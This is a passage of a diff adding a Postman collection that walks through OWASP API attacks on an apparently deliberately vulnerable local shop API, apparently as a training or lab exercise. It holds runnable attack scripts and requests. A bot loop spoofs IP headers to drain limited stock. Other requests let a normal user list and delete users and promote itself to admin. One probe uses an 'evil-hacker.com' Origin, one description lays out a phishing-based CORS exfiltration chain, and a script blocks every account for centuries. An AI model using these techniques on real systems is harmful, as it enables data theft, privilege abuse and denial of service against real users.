+											"            });",
+											"        });",
+											"    });",
+											"}",
+											"",
+											"for (let i = 1; i <= TOTAL_BOTS; i++) {",
+											"    // small delay to avoid crashing Postman locally",
+											"    setTimeout(() => launchBot(i), i * 100); ",
+											"}",
+											"",
+											"function checkFinish() {",
+											"    botsFinished++;",
+											"    if (botsFinished >= TOTAL_BOTS) {",
+											"        console.log(\"---------------------------------------------------\");",
+											"        console.log(`FINAL REPORT: ${stockAcquired} products acquired out of ${TOTAL_BOTS} attempts.`);",
+											"        console.log(\"---------------------------------------------------\");",
+											"        ",
+											"        pm.test(\"VULNERABILITY: Scalper bots drained stock\", function () {",
+											"            pm.expect(stockAcquired).to.be.above(0);",
+											"        });",
+											"    }",
+											"}",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/products/999",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"products",
+										"999"
+									]
+								},
+								"description": "We use a Postman test script to loop this process.  \n**The Script:**\n\n1. Generates random fake IPs for `X-Forwarded-For`.\n    \n2. Registers a new random user for each iteration.\n    \n3. Logs in and buys the product.  \n    **Impact:** The entire stock is depleted in seconds by a single attacker appearing as hundreds of different users."
+							},
+							"response": []
+						}
+					],
+					"description": "**Goal:** Buy all limited-edition items using automation, bypassing quotas and IP restrictions."
+				},
+				{
+					"name": "06 - API5 Broken Function Level Authorization",
+					"item": [
+						{
+							"name": "Request 6.1 : Access all users",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/admin/users",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"users"
+									]
+								},
+								"description": "API5 Vulnerability: A normal user can access the list of all the users registered on the site, even the admins."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 6.2 : Access all orders",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/admin/orders",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"orders"
+									]
+								},
+								"description": "Access to all business transactions by all the users."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 6.3 : Delete user account",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "DELETE",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/admin/users/10",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"users",
+										"10"
+									]
+								},
+								"description": "Destructive action : deleting a user. It can be performed by a normal user."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 6.4 : Access contact form",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/admin/messages",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"messages"
+									]
+								},
+								"description": "Access to messages sent to the business company from contact form"
+							},
+							"response": []
+						},
+						{
+							"name": "Request 6.5 : Access private stats",
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [
+									{
+										"key": "X-Forwarded-For",
+										"value": "1.2.3.4",
+										"type": "text"
+									},
+									{
+										"key": "User-Agent",
+										"value": "PostmanRuntime/Fuzzer",
+										"type": "text"
+									}
+								],
+								"url": {
+									"raw": "{{base_url}}/admin/stats",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"stats"
+									]
+								},
+								"description": "An endpoint which seems to hide important private statistics about the company. This endpoint can not be accessed."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 6.6 : Promote attacker to admin",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "POST",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/admin/promote/{{attacker_id}}",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"promote",
+										"{{attacker_id}}"
+									]
+								},
+								"description": "The attacker can promote themselves because of the same vulnerability that the other admin endpoints have."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 6.7 : Login Attacker to get Admin Token",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"var jsonData = pm.response.json();",
+											"var tokenAttacker = jsonData.access_token;",
+											"if (tokenAttacker) {",
+											"    pm.environment.set(\"admin_attacker_token\", tokenAttacker);",
+											"}"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "username",
+											"value": "badguy",
+											"type": "text"
+										},
+										{
+											"key": "password",
+											"value": "thisismypwd!",
+											"type": "text"
+										}
+									]
+								},
+								"url": {
+									"raw": "{{base_url}}/auth/login",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								},
+								"description": "We log in as the legitimate Administrator. This is necessary to set up the environment for Phase 4."
+							},
+							"response": []
+						}
+					],
+					"description": "**Goal:** Perform administrative actions as a standard user because the server checks _authentication_ (who you are) but not _authorization_ (what role you have).\n\nThe server relies on the client to hide admin buttons in the UI, but the API endpoints themselves do not verify the user's role (Admin vs User) before executing the action."
+				}
+			],
+			"description": "Exploiting flaws in the application's design (logic) and access control hierarchy (privileges)."
+		},
+		{
+			"name": "PHASE 4 - Infrastructure weaknesses and Availability",
+			"item": [
+				{
+					"name": "07 - API8 Security Misconfiguration",
+					"item": [
+						{
+							"name": "Request 7.1 : Second try to access private stats",
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{admin_attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [
+									{
+										"key": "X-Forwarded-For",
+										"value": "1.2.3.4",
+										"type": "text"
+									},
+									{
+										"key": "User-Agent",
+										"value": "PostmanRuntime/Fuzzer",
+										"type": "text"
+									}
+								],
+								"url": {
+									"raw": "{{base_url}}/admin/stats",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"stats"
+									]
+								},
+								"description": "A standard request to check again if we can now access the stats, with admin privileges this time.\n\nWe can not."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 7.2. : Revealing CORS misconfiguration",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											""
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{admin_attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "OPTIONS",
+								"header": [
+									{
+										"key": "X-Forwarded-For",
+										"value": "1.2.3.4",
+										"type": "text"
+									},
+									{
+										"key": "Origin",
+										"value": "http://evil-hacker.com",
+										"type": "text"
+									},
+									{
+										"key": "Access-Control-Request-Method",
+										"value": "GET",
+										"type": "text"
+									}
+								],
+								"url": {
+									"raw": "{{base_url}}/admin/stats",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"stats"
+									]
+								},
+								"description": "We manually add the HTTP Header `Origin: http://evil-site.com`.  \n**Result:** If the server is vulnerable, it will respond with `Access-Control-Allow-Origin: \\*` (or echo the evil site) and `Access-Control-Allow-Credentials: true`. This means a malicious website could make requests to this API on behalf of a logged-in user and read their data.\n\nHere, it echoes the evil site."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 7.3. : Read private stats sent to contact",
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{admin_attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [
+									{
+										"key": "X-Forwarded-For",
+										"value": "1.2.3.4",
+										"type": "text"
+									},
+									{
+										"key": "User-Agent",
+										"value": "PostmanRuntime/Fuzzer",
+										"type": "text"
+									}
+								],
+								"url": {
+									"raw": "{{base_url}}/admin/messages",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"messages"
+									]
+								},
+								"description": "The attacker performs a sophisticated Cross-Origin attack to bypass the IP filtering.\n\n**The Attack Chain:**\n\n1. **Social Engineering:** The attacker sends a malicious HTML file to a legitimate administrator, hoping they open it. (Open the file attack/api8_cors_attacks.html to mimic the administrator getting trapped).\n    \n2. **Internal Execution:** The administrator opens the file inside the company's private network. The script inside fetches `/admin/stats`. Since the request originates from a trusted internal IP, the firewall allows it.\n    \n3. **CORS Exploitation:** The malicious script can read the response because the API's CORS policy is too permissive (allows arbitrary origins).\n    \n4. **Exfiltration:** The script automatically POSTs the retrieved data to the public `/contact` form.\n    \n\n**Goal:** We now use our stolen Admin privileges to read the contact messages and retrieve the exfiltrated statistics."
+							},
+							"response": []
+						}
+					],
+					"description": "Demonstrate that the API allows requests from unauthorized domains (Cross-Origin Resource Sharing)."
+				},
+				{
+					"name": "08 - API4 DoS",
+					"item": [
+						{
+							"name": "Request 8.1 : Get user id",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"if (pm.response.code === 200) {",
+											"    var users = pm.response.json();",
+											"    if (users.length > 0) {",
+											"        var firstUser = users[0];",
+											"        var firstUserId = firstUser.id;",
+											"        pm.environment.set(\"user_id\", firstUserId);",
+											"        console.log(\"First user retrieved\");",
+											"        console.log(\"  - ID: \" + firstUserId);",
+											"        console.log(\"  - Username: \" + firstUser.username);",
+											"        console.log(\"  - Email: \" + firstUser.email);",
+											"        console.log(\"  - Role: \" + firstUser.role);",
+											"        console.log(\"  - Blocked: \" + firstUser.blocked);",
+											"    } else {",
+											"        console.log(\"No users found\");",
+											"    }",
+											"} else {",
+											"    console.log(\"Error: \" + pm.response.code);",
+											"}"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/admin/users",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"users"
+									]
+								},
+								"description": "Get the id of a user."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 8.2 : Modify blocked value",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"if (pm.response.code === 200) {",
+											"    var user = pm.response.json();",
+											"    console.log(\"User blocked successfully\");",
+											"    console.log(\"  - ID: \" + user.id);",
+											"    console.log(\"  - Username: \" + user.username);",
+											"    console.log(\"  - Blocked timestamp: \" + user.blocked);",
+											"    console.log(\"  - Unblock date: November 16, 2286\")",
+											"} else {",
+											"    console.log(\"Error during blocking: \" + pm.response.code);",
+											"    console.log(pm.response.text());",
+											"}"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "PATCH",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"blocked\": 9999999999\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{base_url}}/users/2",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"users",
+										"2"
+									]
+								},
+								"description": "Modify the \"blocked\" value to 99999 (timestamp meaning the year 2286) so the user can't connect until a long time."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 8.3 : Block all users",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"if (pm.response.code === 200) {",
+											"    var users = pm.response.json();",
+											"    var totalUsers = users.length;",
+											"    var blocked_timestamp = 9999999999; // Year 2286",
+											"    ",
+											"    // Attacker ID excluded",
+											"    var attackerID = 666; ",
+											"    console.log(\"[START] DoS Attack (Except ID \" + attackerID + \")\");",
+											"    var successCount = 0;",
+											"    var token = pm.environment.get(\"token\");",
+											"    if (!token) {",
+											"        token = pm.request.headers.get(\"Authorization\").replace(\"Bearer \", \"\");",
+											"    }",
+											"    ",
+											"    users.forEach(function(user, index) {        ",
+											"        if (user.id === attackerID) {",
+											"            console.log(\"-> SKIP: User \" + user.username + \" (ID \" + user.id + \") is the attacker.\");",
+											"            return;",
+											"        }",
+											"",
+											"        setTimeout(function() {",
+											"            pm.sendRequest({",
+											"                url: 'http://localhost:8000/users/' + user.id,",
+											"                method: 'PATCH',",
+											"                header: {",
+											"                    'Authorization': 'Bearer ' + token,",
+											"                    'Content-Type': 'application/json'",
+											"                },",
+											"                body: {",
+											"                    mode: 'raw',",
+											"                    raw: JSON.stringify({",
+											"                        \"blocked\": blocked_timestamp",
+											"                    })",
+											"                }",
+											"            }, function (err, res) {",
+											"                if (res.code === 200) {",
+											"                    successCount++;",
+											"                    console.log(\"-> BLOCKED: \" + user.username + \" (ID: \" + user.id + \")\");",
+											"                } else {",
+											"                    console.log(\"-> FAILED: \" + user.username + \" (Code: \" + res.code + \")\");",
+											"                }",
+											"            });",
+											"        }, index * 50);",
+											"    });",
+											"    ",
+											"} else {",
+											"    console.log(\"Error: Unable to retrieve the user list.\");",
+											"}"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "bearer",
+									"bearer": [
+										{
+											"key": "token",
+											"value": "{{attacker_token}}",
+											"type": "string"
+										}
+									]
+								},
+								"method": "GET",
+								"header": [],
+								"url": {
+									"raw": "{{base_url}}/admin/users",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"admin",
+										"users"
+									]
+								},
+								"description": "Block all users by getting their id and modifying the \"blocked\" value."
+							},
+							"response": []
+						},
+						{
+							"name": "Request 8.4: Login Simple User Impossible",
+							"event": [
+								{
+									"listen": "test",
+									"script": {
+										"exec": [
+											"pm.test(\"Login successful\", function() {",
+											"    pm.response.to.have.status(200);",
+											"});",
+											"var jsonData = pm.response.json();",
+											"var tokenAttacker = jsonData.access_token;",
+											"if (tokenAttacker) {",
+											"    pm.environment.set(\"attacker_token\", tokenAttacker);",
+											"    pm.environment.set(\"attacker_id\", jsonData.user_id);",
+											"    console.log(\"---------------------------------------------------\");",
+											"    console.log(\"[INFO] COPY THIS TOKEN FOR JWT.IO :\");",
+											"    console.log(tokenAttacker);",
+											"    console.log(\"---------------------------------------------------\");",
+											"}"
+										],
+										"type": "text/javascript",
+										"packages": {},
+										"requests": {}
+									}
+								}
+							],
+							"request": {
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "urlencoded",
+									"urlencoded": [
+										{
+											"key": "username",
+											"value": "user1",
+											"type": "text"
+										},
+										{
+											"key": "password",
+											"value": "password123",
+											"type": "text"
+										}
+									]
+								},
+								"url": {
+									"raw": "{{base_url}}/auth/login",
+									"host": [
+										"{{base_url}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								},
+								"description": "Try to login with one of the account blocked : it doesn't work."
+							},
+							"response": []
+						}
+					],
+					"description": "DoS by augmenting blocked number for every user."
+				}
+			],
+			"description": "Server configuration errors (CORS) and lack of resource limitations (DoS)."
+		}
+	]
+}
